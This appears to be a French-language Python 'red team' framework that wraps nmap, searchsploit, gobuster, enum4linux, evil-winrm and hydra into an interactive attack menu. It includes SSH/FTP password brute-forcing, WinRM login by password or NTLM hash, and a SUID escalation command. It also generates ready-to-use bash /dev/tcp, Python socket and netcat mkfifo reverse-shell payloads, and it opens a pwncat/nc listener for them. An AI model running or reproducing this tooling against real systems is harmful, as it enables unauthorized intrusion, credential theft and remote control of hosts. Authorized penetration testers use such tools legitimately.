import nmap
import subprocess
import os
import sys
from datetime import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
import questionary

console = Console()

donnees_rapport = {
    "cible": "", "date": "", "ports": [], "vulns": [], "mots_de_passe": []
}

# --- SYSTÈME D'AUTO-UPDATE (Secours interne) ---
def auto_update():
    if os.path.exists(".git"):
        console.print("[dim cyan][*] Recherche de mises à jour sur GitHub...[/dim cyan]")
        try:
            subprocess.run(["git", "fetch", "--all"], capture_output=True, timeout=5)
            subprocess.run(["git", "reset", "--hard", "origin/main"], capture_output=True, timeout=5)
            res = subprocess.run(["git", "pull"], capture_output=True, text=True, timeout=5)
            if "Already up to date" not in res.stdout and "files changed" in res.stdout:
                console.print("[bold yellow][!] Nouvelle version détectée et téléchargée ! Redémarrage...[/bold yellow]")
                os.execv(sys.executable, ['python'] + sys.argv)
        except Exception: pass

def ecrire_rapport(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not os.path.exists("rapports"): os.makedirs("rapports")
    with open("rapports/rapport_audit.txt", "a") as f: f.write(f"[{timestamp}] {message}\n")

def generer_html():
    if not os.path.exists("rapports"): 
        os.makedirs("rapports")
        
    # --- Création du nom de fichier dynamique ---
    ip_cible = donnees_rapport['cible'].replace('/', '_') # Sécurité au cas où il y a un slash
    date_heure = datetime.now().strftime("%Y-%m-%d_%Hh%M")
    nom_fichier = f"rapports/{ip_cible}_{date_heure}.html"
    # --------------------------------------------

    html = f"<html><head><meta charset='utf-8'><title>Rapport - {donnees_rapport['cible']}</title></head>"
    html += f"<body style='font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; padding: 20px;'>"
    html += f"<h1 style='color: #00ff00;'>☠️ Rapport d'Audit : {donnees_rapport['cible']}</h1>"
    html += f"<h3 style='color: #aaaaaa;'>📅 Date de l'attaque : {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}</h3><hr>"
    html += "<h2>Vulnérabilités / Découvertes</h2><table border='1' style='border-collapse: collapse; width: 100%; text-align: left;'>"
    html += "<tr style='background: #333;'><th>Sévérité</th><th>Outil</th><th>Détail</th></tr>"
    
    if not donnees_rapport["vulns"]:
        html += "<tr><td colspan='3' style='text-align:center;'>Aucune vulnérabilité n'a été enregistrée pour cette session.</td></tr>"
    else:
        for v in donnees_rapport["vulns"]: 
            html += f"<tr><td>{v.get('severite', 'Info')}</td><td>{v['outil']}</td><td>{v['nom']}</td></tr>"
            
    html += "</table></body></html>"
    
    # On sauvegarde dans le fichier avec le nouveau nom unique
    with open(nom_fichier, "w", encoding="utf-8") as f: 
        f.write(html)
        
    console.print(f"\n[bold green]>>> 📄 Rapport sauvegardé avec succès : {nom_fichier} <<<[/bold green]")

# --- ÉTAPE 1 : SCAN (NMAP) ---
def scan_target(ip, agressif=False):
    donnees_rapport["cible"] = ip
    nm = nmap.PortScanner()
    results = []
    
    # Arguments par défaut
    args = '-Pn -sV -T4'
    msg = f"[bold green]Analyse furtive de {ip} en cours...[/bold green]"
    
    # Arguments si on choisit le scan poussé
    if agressif:
        args = '-Pn -sV -p- -T4' # -p- force le scan des 65535 ports existants
        msg = f"[bold red]Analyse AGRESSIVE (65535 ports) de {ip} en cours... (Patientez)[/bold red]"

    with console.status(msg):
        try:
            nm.scan(ip, arguments=args)
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        if nm[host][proto][port]['state'] == 'open':
                            p_info = {
                                'port': port, 
                                'service': nm[host][proto][port]['name'], 
                                'product': nm[host][proto][port].get('product', ''), 
                                'version': nm[host][proto][port].get('version', '')
                            }
                            results.append(p_info)
                            donnees_rapport["ports"].append(p_info)
        except Exception as e: console.print(f"[bold red]Erreur Nmap : {e}[/bold red]")
    return results

# --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT (ANTI-SPAM V2) ---
def run_searchsploit(open_ports):
    console.print("\n[bold yellow][*] Recherche d'Exploits (Smart Mode V2)...[/bold yellow]")
    services_deja_vus = set()

    for p in open_ports:
        # On récupère le nom complet du produit ou du service
        produit_complet = p.get('product', '')
        if not produit_complet:
            produit_complet = p.get('service', '')

        # Nettoyage de la version (on ignore le mot "inconnue")
        version = p.get('version', '').split()[0] if p.get('version') else ""
        if version.lower() == "inconnue":
            version = ""

        if not produit_complet:
            continue

        # LE CERVEAU ANTI-SPAM : 
        # Si le nom commence par un mot très générique, on garde 2 mots au lieu d'un.
        mots = produit_complet.split()
        mots_generiques = ["microsoft", "apache", "nginx", "vmware", "oracle"]
        
        if len(mots) > 1 and mots[0].lower() in mots_generiques:
            terme_recherche = f"{mots[0]} {mots[1]}"  # Ex: "Microsoft HTTPAPI"
        else:
            terme_recherche = mots[0]  # Ex: "vsftpd"

        signature = f"{terme_recherche}_{version}"
        if signature in services_deja_vus:
            continue
        
        services_deja_vus.add(signature)
        
        console.print(f"\n[bold blue]🔍 Test générique : {terme_recherche}[/bold blue]")
        subprocess.run(["searchsploit", "--disable-colour", terme_recherche])
        
        if version:
            console.print(f"[bold magenta]🎯 Test précis : {terme_recherche} {version}[/bold magenta]")
            subprocess.run(["searchsploit", "--disable-colour", terme_recherche, version])
        else:
            console.print(f"[dim yellow]ℹ️ Version non détectée pour {terme_recherche}, scan précis ignoré.[/dim yellow]")

# --- ÉTAPE 3 : WEB (GOBUSTER DYNAMIQUE & ANTI-WILDCARD) ---
def run_web_enum(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
    
    console.print("\n[bold yellow][*] Création du dictionnaire 'Juicy' (Fusion propre)...[/bold yellow]")
    juicy_words = [
        "admin", "panel", "password", "pass", "user", "users", "login", 
        "backup", "db", "config", "secret", "api", "test", "dev", ".git", ".env"
    ]
    
    # 1. Fusion propre en Python (Corrige le bug 'cat >>')
    with open("juicy_words.txt", "w") as f:
        for word in juicy_words:
            f.write(f"{word}\n")
        # Si on a un fichier common.txt, on l'ajoute à la suite
        if os.path.exists("common.txt"):
            with open("common.txt", "r") as common_file:
                f.write(common_file.read())

    for port in web_ports:
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
        console.print(f"\n[bold cyan]=== Profilage WhatWeb pour {url} ===[/bold cyan]")
        try:
            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
            if res.stdout:
                for techno in res.stdout.strip().split(', '): console.print(f"> {techno}")
        except Exception: pass

        console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours sur {url}...[/bold yellow]")
        
        # 2. Ajout de --wildcard pour contourner les protections F5 BIG-IP
        try:
            cmd = ["gobuster", "dir", "-u", url, "-w", "juicy_words.txt", "-q", "-t", "20"]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
            
            for line in process.stdout:
                # On affiche seulement ce qui est vraiment intéressant
                if "Status: 200" in line or "Status: 204" in line or "Status: 301" in line:
                    console.print(f"[bold green][+] {line.strip()}[/bold green]")
        except KeyboardInterrupt: 
            console.print("[dim yellow]Gobuster annulé par l'utilisateur.[/dim yellow]")
            pass

# --- ÉTAPE 4 : ARSENAL WINDOWS (WINRM & ENUM4LINUX) ---
def windows_arsenal(ip):
    console.print("\n[bold cyan]🪟  ARSENAL WINDOWS 🪟[/bold cyan]")
    table = Table(show_header=False)
    table.add_row("1", "Enum4Linux (Scan complet SMB/Utilisateurs/Domaine)")
    table.add_row("2", "Evil-WinRM (Connexion Shell via Hash/Mot de passe)")
    console.print(table)
    
    choix = questionary.select("Choisis ton arme :", choices=["1", "2"]).ask()
    
    if choix == "1":
        console.print(f"\n[bold yellow][*] Lancement d'Enum4Linux sur {ip}...[/bold yellow]")
        subprocess.run(["enum4linux", "-a", ip])
    elif choix == "2":
        user = questionary.text("Nom d'utilisateur :").ask()
        password = questionary.text("Mot de passe ou Hash NTLM :").ask()
        console.print(f"\n[bold yellow][*] Connexion WinRM en cours...[/bold yellow]")
        subprocess.run(["evil-winrm", "-i", ip, "-u", user, "-p", password])

# --- ÉTAPE 5 : BRUTEFORCE (HYDRA) ---
def run_hydra(ip, open_ports):
    cibles = [p for p in open_ports if any(s in p['service'].lower() for s in ['ssh', 'ftp'])]
    if not cibles: return console.print("[bold red]Aucun port bruteforçable détecté.[/bold red]")
    for i, p in enumerate(cibles): console.print(f"{i+1}. Port {p['port']} ({p['service']})")
    choix = int(Prompt.ask("Service ?", choices=[str(i+1) for i in range(len(cibles))])) - 1
    cible = cibles[choix]
    user = questionary.text("Utilisateur à attaquer :", default="root").ask()
    
    try:
        process = subprocess.Popen(["hydra", "-l", user, "-P", "common.txt", "-t", "4", "-s", str(cible['port']), f"{cible['service']}://{ip}"], stdout=subprocess.PIPE, text=True)
        for line in process.stdout:
            if "login:" in line.lower(): console.print(f"[bold green]>>> SUCCÈS : {line.strip()} <<<[/bold green]")
    except Exception as e: console.print(f"[bold red]Erreur : {e}[/bold red]")

# --- ÉTAPE 6 : PRIVESC (SUID) ---
def run_suid_helper():
    console.print(Panel("[bold red]LANCE CETTE COMMANDE SUR LA CIBLE (SSH/Shell) :[/bold red]\n\n[green]find / -perm -u=s -type f 2>/dev/null[/green]", title="Escalade SUID"))

# --- ÉTAPE 7 : REVERSE SHELLS (AVEC PWNCAT C2) ---
def run_payload_generator():
    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS (SUPER C2) ☠️[/bold red]")
    ip = questionary.text("Ton IP d'écoute (ex: tun0) :").ask()
    port = questionary.text("Ton port d'écoute :", default="4444").ask()
    
    console.print(f"\n[bold yellow][*] Ouverture du Super Listener (Pwncat) sur le port {port}...[/bold yellow]")
    try:
        # Pwncat stabilisera le shell automatiquement. S'il plante, on fallback sur Netcat.
        cmd_listener = f"bash -c 'sudo pwncat-cs -lp {port} || sudo nc -lvnp {port}; exec bash'"
        subprocess.Popen(["x-terminal-emulator", "-e", cmd_listener])
        console.print("[bold green][+] Fenêtre du C2 ouverte ! (Fais Ctrl+D pour revenir au framework local quand tu auras le shell)[/bold green]\n")
    except Exception as e:
        console.print(f"[dim red]Échec de l'ouverture auto, lance : sudo pwncat-cs -lp {port}[/dim red]\n")

    table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
    table.add_column("Type", style="magenta"); table.add_column("Commande", style="green")
    table.add_row("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
    table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
    table.add_row("Netcat", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    console.print(table)
    

# --- MENU PRINCIPAL (INTERACTIF) ---
def interactive_menu(ip, open_ports):
    while True:
        table = Table(title=f"Arsenal Pointé sur : {ip}", border_style="blue")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="magenta")
        table.add_column("Version", style="yellow")
        for p in open_ports: 
            table.add_row(str(p['port']), p['product'] or p['service'], p['version'] or "Inconnue")
        console.print(table)
        
        choix = questionary.select(
            "💻 Que voulez-vous faire ?",
            choices=[
                "1. Recherche d'exploits (Searchsploit Intelligent)",
                "2. Énumération Web (WhatWeb & Gobuster Dynamique)",
                "3. Arsenal Windows (Enum4Linux & WinRM)",
                "4. Bruteforce (Hydra)",
                "5. Usine à Reverse Shells (Super C2 Pwncat)",
                "6. Aide Escalade de Privilèges (SUID)",
                "7. Générer Rapport & Quitter"
            ]
        ).ask()
        
        if not choix: sys.exit()
        
        if "1." in choix: run_searchsploit(open_ports)
        elif "2." in choix: run_web_enum(ip, open_ports)
        elif "3." in choix: windows_arsenal(ip)
        elif "4." in choix: run_hydra(ip, open_ports)
        elif "5." in choix: run_payload_generator()
        elif "6." in choix: run_suid_helper()
        elif "7." in choix: 
            generer_html()
            break

if __name__ == "__main__":
    auto_update()
    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V16.2[/bold red]", subtitle="Elite Red Team Edition"))
    
    cible = ""
    # Si on lance avec l'IP directement en argument (ex: cyber 192.168.1.1)
    if len(sys.argv) > 1:
        cible = sys.argv[1].replace("https://", "").replace("http://", "").split("/")[0]

    # Boucle infinie pour garder le framework ouvert
    while True:
        if not cible:
            entree_brute = questionary.text("IP de la cible (ou Réseau) :").ask()
            if not entree_brute: sys.exit()
            cible = entree_brute.replace("https://", "").replace("http://", "").split("/")[0] if "/" not in entree_brute else entree_brute
        
        # Premier scan classique
        ports = scan_target(cible)
        
        if ports: 
            interactive_menu(cible, ports)
            cible = "" # Réinitialise l'IP quand on quitte le menu pour en scanner une autre
        else: 
            console.print("\n[bold red]❌ Aucun port standard trouvé ou cible injoignable.[/bold red]")
            choix_fail = questionary.select(
                "Que voulez-vous faire ?",
                choices=[
                    "1. 🚀 Lancer un scan AGRESSIF (Tous les 65535 ports, plus lent)",
                    "2. 🔄 Scanner une autre IP / Réseau",
                    "3. 🚪 Quitter"
                ]
            ).ask()

            if not choix_fail or "3." in choix_fail:
                sys.exit()
            elif "1." in choix_fail:
                # Deuxième chance : Scan Agressif
                ports = scan_target(cible, agressif=True)
                if ports:
                    interactive_menu(cible, ports)
                else:
                    console.print("\n[bold red]☠️ Même en mode agressif, la cible est verrouillée (ou éteinte).[/bold red]\n")
                cible = "" # On forcera à demander une nouvelle IP au prochain tour
            elif "2." in choix_fail:
                cible = "" # Ça va recommencer la boucle et redemander l'IP
